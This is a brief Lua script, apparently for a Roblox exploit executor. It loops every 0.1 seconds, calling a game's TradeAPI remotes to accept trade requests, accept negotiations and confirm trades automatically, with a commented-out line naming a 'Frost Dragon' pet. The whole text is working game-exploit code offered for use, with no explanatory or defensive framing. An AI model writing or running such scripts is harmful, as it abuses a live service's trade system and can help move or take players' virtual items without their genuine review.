--pet_high = "Frost Dragon"
--function RemovePet()

while task.wait(0.1) do
require(game.ReplicatedStorage.Fsys).load("RouterClient").get("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(true)
    require(game.ReplicatedStorage.Fsys).load("RouterClient").get("TradeAPI/AcceptNegotiation"):FireServer()
    require(game.ReplicatedStorage.Fsys).load("RouterClient").get("TradeAPI/ConfirmTrade"):FireServer()
end
